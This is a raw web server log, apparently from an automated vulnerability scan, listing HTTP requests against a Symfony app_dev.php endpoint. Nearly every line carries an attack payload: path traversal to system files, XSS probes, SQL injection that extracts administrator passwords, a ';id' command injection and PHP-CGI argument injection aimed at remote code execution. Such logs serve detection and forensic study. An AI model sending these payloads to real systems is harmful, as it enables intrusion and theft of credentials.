917442,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/Poll_It_SSI_v2.0.cgi?data_dir=%2Fboot.ini%00,1541184372,85a608
85a608,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/Poll_It_SSI_v2.0.cgi?data_dir=%2Fboot.ini%00,1541184372,
2eff4d,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/fr_left.php,1541184378,0c9222
0c9222,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/fr_left.php,1541184379,
a3a4b8,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/start.php,1541184378,b1c32e
fdb991,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module.php?file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&module=osTicket,1541184379,570dc6
b1c32e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/start.php,1541184379,
570dc6,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module.php?file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&module=osTicket,1541184379,
2137b4,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/Poll_It_SSI_v2.0.cgi?data_dir=%2Fwinnt%2Fwin.ini%00,1541184379,610187
610187,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/Poll_It_SSI_v2.0.cgi?data_dir=%2Fwinnt%2Fwin.ini%00,1541184379,
b62beb,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module.php?file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&module=osTicket,1541184382,f64848
f64848,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module.php?file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini&module=osTicket,1541184382,
020953,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module.php?file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini&module=osTicket,1541184384,3b58fb
3b58fb,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module.php?file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini&module=osTicket,1541184384,
5eae96,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/tombstone.cfm?ProfileID=%3Cscript%3Efoo%3C%2Fscript%3E,1541184390,1116a1
1116a1,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/tombstone.cfm?ProfileID=%3Cscript%3Efoo%3C%2Fscript%3E,1541184390,
2cf1ec,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/login.php?login=%3Cscript%3Efoo%3C%2Fscript%3E,1541184393,0375b9
0375b9,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/login.php?login=%3Cscript%3Efoo%3C%2Fscript%3E,1541184393,
8c3db4,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/sitemap.php?id_site=%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3C%2Fscript%3E,1541184396,59e496
59e496,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/sitemap.php?id_site=%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3C%2Fscript%3E,1541184397,
3d2025,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/help/copyright.html,1541184405,2b851e
2b851e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/help/copyright.html,1541184406,
3a7141,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/system/rss.php?id=-1%20union%20select%201%2C22222222222%2C3%2C4%2C5%2C6%2C7%2C8%2C0x53514c2d496e6a656374696f6e2d54657374%3B,1541184406,e998db
e998db,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/system/rss.php?id=-1%20union%20select%201%2C22222222222%2C3%2C4%2C5%2C6%2C7%2C8%2C0x53514c2d496e6a656374696f6e2d54657374%3B,1541184407,
9d412e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/news.php?news_id=4%20union%20all%20select%200%2C1%2C2%2C0x53514c2d496e6a656374696f6e2d54657374,1541184408,0b8032
0b8032,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/news.php?news_id=4%20union%20all%20select%200%2C1%2C2%2C0x53514c2d496e6a656374696f6e2d54657374,1541184408,
b8a5e8,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/search.php?dosearch=true&query=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,1541184414,ba871e
ba871e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/search.php?dosearch=true&query=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,1541184414,
d41e00,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?%3Fp=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184418,c9f8c4
004e4d,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/ods-cgi/odscgi?HTMLFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1541184418,2d53ea
c9f8c4,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?%3Fp=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184418,
2d53ea,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/ods-cgi/odscgi?HTMLFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1541184418,
55ea16,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/athenareg.php?pass=%20%3Bid,1541184420,bc9123
bc9123,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/athenareg.php?pass=%20%3Bid,1541184420,
6297a2,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?%3Fp=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184422,50f0b9
50f0b9,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?%3Fp=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184422,
914325,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/desktop.php,1541184425,d9c7fe
d9c7fe,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/desktop.php,1541184425,
3c59fd,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?%3Fp=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184426,ed5fa4
ed5fa4,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?%3Fp=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184427,
fb8138,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/ods-cgi/odscgi?HTMLFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini,1541184427,4ee51e
4ee51e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/ods-cgi/odscgi?HTMLFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini,1541184427,
50abe7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/ods-cgi/odscgi?HTMLFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini,1541184435,8cd066
8cd066,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/ods-cgi/odscgi?HTMLFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini,1541184436,
fc04e5,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/welcome.php,1541184438,c946db
c946db,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/welcome.php,1541184438,
a25fa3,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/language/en/text.php/<script>alert('openvas-xss-test');</script>,1541184448,d0e438
d0e438,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/language/en/text.php/<script>alert('openvas-xss-test');</script>,1541184448,
626ad9,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/myevent.php?myevent_path=%2F%00,1541184457,ff8448
ff8448,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/myevent.php?myevent_path=%2F%00,1541184457,
98dde9,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?p=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184459,37afa6
37afa6,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?p=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184460,
a48620,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/splash.php,1541184460,9d799f
9d799f,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/splash.php,1541184460,
8285a1,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/myevent.php?myevent_path=%2F%00,1541184461,653a0d
653a0d,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/myevent.php?myevent_path=%2F%00,1541184461,
d3b731,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?p=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184464,52e3eb
d183f7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/myevent.php?myevent_path=%2F%00,1541184464,947ad0
52e3eb,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?p=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184465,
947ad0,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/myevent.php?myevent_path=%2F%00,1541184465,
a4a2b9,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/plugins/system/shadowbox/min/index.php?ad=base&g=sb&lan=en&play=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184466,f3c967
f3c967,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/plugins/system/shadowbox/min/index.php?ad=base&g=sb&lan=en&play=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184467,
49eb72,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?p=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184468,4c00cb
4c00cb,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?p=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184469,
7ca017,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/plugins/system/shadowbox/min/index.php?ad=base&g=sb&lan=en&play=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184471,77fbc1
77fbc1,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/plugins/system/shadowbox/min/index.php?ad=base&g=sb&lan=en&play=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184471,
c499da,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/medialist.php,1541184473,78d188
78d188,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/medialist.php,1541184473,
e864b2,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/plugins/system/shadowbox/min/index.php?ad=base&g=sb&lan=en&play=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184475,c2b179
c2b179,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/plugins/system/shadowbox/min/index.php?ad=base&g=sb&lan=en&play=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184476,
1a3263,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/message.php?skin=%22%3E%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3C%2Fscript%3E,1541184482,fd9d2d
fd9d2d,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/message.php?skin=%22%3E%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3C%2Fscript%3E,1541184482,
25e976,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW,1541184489,349d33
349d33,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW,1541184489,
f9d6de,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/AccountSections.php/%22%3E%3Cscript%3Ealert(/openvas-xss-test/);%3C/script%3E,1541184494,9b850a
9b850a,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/AccountSections.php/%22%3E%3Cscript%3Ealert(/openvas-xss-test/);%3C/script%3E,1541184494,
b819c9,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/upload/index.php,1541184495,d02c3e
d02c3e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/upload/index.php,1541184495,
597866,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/htsearch?config=openvas&exclude=&format=builtin-long&method=and&restrict=&sort=score&words=,1541184501,5c7d22
5c7d22,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/htsearch?config=openvas&exclude=&format=builtin-long&method=and&restrict=&sort=score&words=,1541184502,
26f97b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/Presenter/index.fsp?signout=true,1541184503,acf5a1
acf5a1,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/Presenter/index.fsp?signout=true,1541184503,
508265,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/?upload_to=,1541184514,eac595
eac595,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/?upload_to=,1541184514,
d4afd7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/dsweb/HomePage,1541184515,275ec9
275ec9,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/dsweb/HomePage,1541184515,
5c537f,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/adframe.php?refresh=example.com%27%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,1541184529,ba5fdc
ba5fdc,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/adframe.php?refresh=example.com%27%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,1541184529,
fcee4f,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/user.cgi?cmd=show&page=%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1541184531,960b77
960b77,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/user.cgi?cmd=show&page=%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1541184531,
9aed3c,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/get_status.cgi,1541184531,e64264
e64264,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/get_status.cgi,1541184531,
fa4c68,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/user.cgi?cmd=show&page=%2F..%2F..%2F..%2Fboot.ini,1541184534,75b08d
75b08d,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/user.cgi?cmd=show&page=%2F..%2F..%2F..%2Fboot.ini,1541184534,
7b00d4,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/user.cgi?cmd=show&page=%2F..%2F..%2F..%2Fwinnt%2Fwin.ini,1541184537,c7e85b
c7e85b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/user.cgi?cmd=show&page=%2F..%2F..%2F..%2Fwinnt%2Fwin.ini,1541184537,
1321f7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/calendar.php,1541184538,61163f
61163f,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/calendar.php,1541184538,
6875b5,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?post=..%2Fconfig%2Fpassword,1541184540,bf4ac7
bf4ac7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?post=..%2Fconfig%2Fpassword,1541184540,
668792,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/products.php,1541184546,80f302
80f302,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/products.php,1541184547,
3bca93,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/admin.php?sid=0%27,1541184550,cc8f4d
cc8f4d,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/admin.php?sid=0%27,1541184550,
7f6a5b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?id=cr6dnuqr0k%27,1541184550,1e853e
1e853e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?id=cr6dnuqr0k%27,1541184551,
f5ec73,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/etc/users.gdb,1541184556,31316b
31316b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/etc/users.gdb,1541184557,
f7592c,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/password_check_token.php?f_email=1&token=%22%3E%3Cscript%3Ealert%28%2Fxss-test%2F%29%3B%3C%2Fscript%3E,1541184561,b2e7bc
b2e7bc,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/password_check_token.php?f_email=1&token=%22%3E%3Cscript%3Ealert%28%2Fxss-test%2F%29%3B%3C%2Fscript%3E,1541184561,
09111f,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/search.php?words=%25%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2CCONCAT%28%27%3C1%3E%27%2Cname%2C%27%3A%27%2Cpassword%2C%27%3C2%3E%27%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2F%2A%2A%2FFROM%2F%2A%2A%2Fsite_administrators%2F%2A%2A%2F%23,1541184566,87f36c
87f36c,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/search.php?words=%25%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2CCONCAT%28%27%3C1%3E%27%2Cname%2C%27%3A%27%2Cpassword%2C%27%3C2%3E%27%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2F%2A%2A%2FFROM%2F%2A%2A%2Fsite_administrators%2F%2A%2A%2F%23,1541184567,
c1dd13,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/htsearch.cgi?words=%22%3E%3Cscript%3Efoo%3C%2Fscript%3E,1541184567,00e56b
00e56b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/htsearch.cgi?words=%22%3E%3Cscript%3Efoo%3C%2Fscript%3E,1541184567,
d23537,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/signin.php,1541184572,e81972
e81972,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/signin.php,1541184572,
f07a9b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/login,1541184577,68b42b
1b00e5,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/upload/index.php,1541184578,791e64
68b42b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/login,1541184578,
791e64,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/upload/index.php,1541184578,
302b6d,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/jgs_portal_statistik.php?meinaction=themen&month=1&year=1%27,1541184601,d5090a
77f907,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/htdocs/index.php,1541184601,3986e5
3986e5,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/htdocs/index.php,1541184601,
d5090a,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/jgs_portal_statistik.php?meinaction=themen&month=1&year=1%27,1541184601,
f0721b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/search.php?seed=1%27,1541184602,84a2e8
84a2e8,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/search.php?seed=1%27,1541184602,
a10c15,5.0.96.151,GET,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php/,1570816257,f46241
f46241,5.0.96.151,GET,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php/,1570816257,aafa4c
aafa4c,5.0.96.151,GET,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php/,1570816257,
8dab92,5.0.96.151,GET,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php/_configurator/step/0,1570816470,
912138,5.0.96.151,GET,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php/?-dallow_url_include%3Don%20-dauto_prepend_file%3Dphp%3A%2F%2Finput,1570820141,8c4725
8c4725,5.0.96.151,POST,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php/?-dallow_url_include%3Don%20-dauto_prepend_file%3Dphp%3A%2F%2Finput,1570820141,9a7e10
9a7e10,5.0.96.151,POST,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php/?-dallow_url_include%3Don%20-dauto_prepend_file%3Dphp%3A%2F%2Finput,1570820141,
ae463f,5.0.96.151,GET,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php/?-d%20allow_url_include%3Don%20-d%20safe_mode%3Doff%20-d%20suhosin.simulation%3Don%20-d%20disable_functions%3D%22%22%20-d%20open_basedir%3Dnone%20-d%20auto_prepend_file%3Dphp%3A%2F%2Finput%20-d%20cgi.force_redirect%3D0%20-d%20cgi.redirect_status_env%3D0%20-n,1570820143,986573
986573,5.0.96.151,POST,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php/?-d%20allow_url_include%3Don%20-d%20safe_mode%3Doff%20-d%20suhosin.simulation%3Don%20-d%20disable_functions%3D%22%22%20-d%20open_basedir%3Dnone%20-d%20auto_prepend_file%3Dphp%3A%2F%2Finput%20-d%20cgi.force_redirect%3D0%20-d%20cgi.redirect_status_env%3D0%20-n,1570820143,0b519c
0b519c,5.0.96.151,POST,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php/?-d%20allow_url_include%3Don%20-d%20safe_mode%3Doff%20-d%20suhosin.simulation%3Don%20-d%20disable_functions%3D%22%22%20-d%20open_basedir%3Dnone%20-d%20auto_prepend_file%3Dphp%3A%2F%2Finput%20-d%20cgi.force_redirect%3D0%20-d%20cgi.redirect_status_env%3D0%20-n,1570820143,
2664f7,5.0.96.151,GET,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php.,1570820803,9104fd
9104fd,5.0.96.151,GET,http://5.13.5.70:8080/ABM_Estadisticas/web/app_dev.php.,1570820803,
87c8cf,5.0.96.151,GET,http://5.13.6.62:8080/ABM_Estadisticas/web/app_dev.php/,1570862802,1645c5
1645c5,5.0.96.151,GET,http://5.13.6.62:8080/ABM_Estadisticas/web/app_dev.php/,1570862803,d848d2
d848d2,5.0.96.151,GET,http://5.13.6.62:8080/ABM_Estadisticas/web/app_dev.php/,1570862803,
e17fde,5.0.96.151,GET,http://5.13.6.62:8080/ABM_Estadisticas/web/app_dev.php/_configurator/step/0,1570863192,
294a99,5.0.96.151,GET,http://5.13.6.62:8080/ABM_Estadisticas/web/app_dev.php/?-dallow_url_include%3Don%20-dauto_prepend_file%3Dphp%3A%2F%2Finput,1570868212,c619f9
